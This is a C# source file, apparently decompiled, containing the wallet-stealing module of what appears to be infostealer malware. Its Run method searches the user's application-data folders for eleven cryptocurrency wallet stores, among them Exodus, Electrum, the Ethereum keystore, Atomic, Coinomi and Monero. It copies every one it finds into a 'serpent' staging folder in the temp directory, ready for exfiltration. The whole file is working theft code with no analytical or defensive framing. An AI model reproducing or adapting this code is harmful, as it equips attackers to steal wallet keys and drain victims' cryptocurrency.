using System;
using System.IO;
using System.Runtime.CompilerServices;

namespace Modules
{
	// Token: 0x0200001A RID: 26
	public class Wallets
	{
		// Token: 0x06000035 RID: 53 RVA: 0x0000418C File Offset: 0x0000238C
		public void Run()
		{
			Console.WriteLine("[+] Executing Wallets");
			string[] array = new string[]
			{
				Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Zcash",
				Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Armory",
				Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\bytecoin",
				Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\com.liberty.jaxx\\IndexedDB\\\\file__0.indexeddb.leveldb",
				Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Exodus\\exodus.wallet",
				Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Ethereum\\keystore",
				Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Electrum\\wallets",
				Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\atomic\\Local Storage\\leveldb",
				Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Guarda\\Local Storage\\leveldb",
				Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Coinomi\\Coinomi\\wallets",
				Environment.GetFolderPath(Environment.SpecialFolder.Personal) + "\\Monero\\wallets"
			};
			string[] array2 = new string[]
			{
				"zcash", "armory", "bytecoin", "liberty", "exodus", "keystore", "electrum", "atomic", "guarda", "coinomi",
				"feather"
			};
			string text = Path.Combine(Path.GetTempPath(), "serpent");
			Console.WriteLine("[+] Checking if 'serpent' folder exists at: " + text);
			if (!Directory.Exists(text))
			{
				Console.WriteLine("[+] 'serpent' folder does not exist, creating it...");
				Directory.CreateDirectory(text);
				Console.WriteLine("[+] 'serpent' folder created at: " + text);
			}
			else
			{
				Console.WriteLine("[+] 'serpent' folder already exists at: " + text);
			}
			for (int i = 0; i < array.Length; i++)
			{
				string text2 = array[i];
				string text3 = array2[i];
				if (Directory.Exists(text2))
				{
					string text4 = Path.Combine(text, text3);
					Console.WriteLine("[+] Found a directory: " + text3);
					Console.WriteLine("[+] Creating a folder for the wallet: " + text4);
					Directory.CreateDirectory(text4);
					Console.WriteLine("[+] Copying contents of the directory to the wallet folder: " + text4);
					Wallets.DirectoryCopy(text2, text4);
					Console.WriteLine("[+] Directory contents copied to: " + text4);
				}
				else
				{
					Console.WriteLine("[+] The path does not exist: " + text2);
				}
			}
		}

		// Token: 0x06000036 RID: 54 RVA: 0x000043E0 File Offset: 0x000025E0
		[global::System.Runtime.CompilerServices.NullableContext(1)]
		private static void DirectoryCopy(string A_0, string A_1)
		{
			DirectoryInfo directoryInfo = new DirectoryInfo(A_0);
			DirectoryInfo[] directories = directoryInfo.GetDirectories();
			foreach (FileInfo fileInfo in directoryInfo.GetFiles())
			{
				string text = Path.Combine(A_1, fileInfo.Name);
				fileInfo.CopyTo(text, true);
			}
			foreach (DirectoryInfo directoryInfo2 in directories)
			{
				string text2 = Path.Combine(A_1, directoryInfo2.Name);
				Wallets.DirectoryCopy(directoryInfo2.FullName, text2);
			}
		}
	}
}
